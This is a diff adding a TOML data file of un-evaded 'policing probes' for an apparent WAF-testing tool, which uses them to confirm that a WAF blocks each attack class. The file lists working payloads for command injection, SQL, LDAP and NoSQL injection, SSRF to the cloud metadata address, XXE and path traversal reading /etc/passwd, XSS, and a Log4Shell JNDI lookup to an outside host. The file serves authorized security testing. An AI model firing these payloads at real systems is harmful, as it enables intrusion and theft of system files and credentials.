@@ -1,0 +1,60 @@
+# Tier-B per-class "policing probes" for differential re-verification.
+#
+# When `wafrift harvest --differential-baseline` re-verifies a recorded bypass,
+# a candidate that simply *reaches the app* is NOT proof of an evasion: if the
+# WAF never policed that sink for that attack class at all, an UN-EVADED attack
+# would reach it just the same (CumulusFire returns 200 for `;id` because no
+# rule matches it — no evasion occurred). To tell a real evasion from a
+# never-policed sink, harvest fires the class's un-evaded probe below into the
+# SAME delivery shape and credits the candidate only if that probe was BLOCKED
+# (proving the WAF polices the sink, so the evaded variant getting through is a
+# genuine bypass). See `equiv_engine::differential_confirmed`.
+#
+# Each probe is a representative, deliberately-NON-evaded attack of its class
+# that a competently-configured WAF should block. They are genuinely live —
+# only fire them against an authorized target (the same authorization gate
+# harvest already enforces). Extend coverage by adding rows here; never hardcode
+# class probes in Rust.
+
+[[probe]]
+class = "cmdi"
+payload = ";cat /etc/passwd"
+
+[[probe]]
+class = "sql"
+payload = "' OR '1'='1' -- "
+
+[[probe]]
+class = "ssrf"
+payload = "http://169.254.169.254/latest/meta-data/"
+
+[[probe]]
+class = "ssti"
+payload = "{{7*7}}"
+
+[[probe]]
+class = "ldap"
+payload = "*)(uid=*))(|(uid=*"
+
+[[probe]]
+class = "nosql"
+payload = "' || '1'=='1"
+
+[[probe]]
+class = "path"
+payload = "../../../../etc/passwd"
+
+[[probe]]
+class = "xxe"
+payload = "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"
+
+[[probe]]
+class = "xss"
+payload = "<script>alert(1)</script>"
+
+# CVE PoCs are heterogeneous; a Log4Shell JNDI string is a widely-recognised
+# representative that a CVE-aware WAF blocks. If a CVE-class sink is unpoliced
+# for this, the recorded variant reaching the app is not evidence of evasion.
+[[probe]]
+class = "cve_pocs"
+payload = "${jndi:ldap://x/a}"
